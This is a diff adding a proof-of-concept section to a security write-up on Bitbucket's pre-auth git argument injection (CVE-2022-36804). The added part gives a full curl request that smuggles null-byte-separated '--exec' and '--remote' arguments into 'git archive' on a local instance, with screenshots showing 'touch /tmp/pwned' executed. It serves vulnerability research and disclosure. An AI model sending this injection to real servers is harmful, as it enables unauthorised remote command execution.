@@ -55,6 +55,21 @@ In pspy Bitbucket generates:
 ~~~
 Here `test` and `canary` show up as separate arguments instead of one. The `%00` split the input and Bitbucket is forced to pass them as independent arguments to git. 
 
+4. Full RCE proof:
+~~~
+curl "http://localhost:7990/rest/api/latest/projects/TEST/repos/DEMO/archive?at=ebbabd99dd2da7bb5f8ed6dea8c988253fb43260&prefix=x%00--exec=touch+/tmp/pwned%00--remote=file:///var/atlassian/application-data/bitbucket/shared/data/repositories/1%00x&format=zip"   
+~~~
+
+A file called ´pwned´
+
+The image below shows pspy catching the full execution chain - `/usr/bin/git archive` running with `--exec` and `--remote` arguments (PID=74412), spawning `/bin/sh` `touch /tmp/pwned` (PID=74413)
+<img width="2820" height="100" alt="Skärmbild 2026-04-12 165103" src="https://github.com/user-attachments/assets/99eb37aa-01f4-409a-9e9a-71d430bdd22e" />
+
+The image below shows `tmp/pwned` created inside the Bitbucket container, confirming command execution using `--exec` argument.
+<img width="782" height="102" alt="Skärmbild 2026-04-12 164846" src="https://github.com/user-attachments/assets/a69dc09a-b520-4ad4-b96d-46dbac8512c8" />
+
+
+
 ## References 
 * Assetnote: Bitbucket pre-auth rce via git argument injection
   - https://www.assetnote.io/resources/research/breaking-bitbucket-pre-auth-remote-command-execution-cve-2022-36804
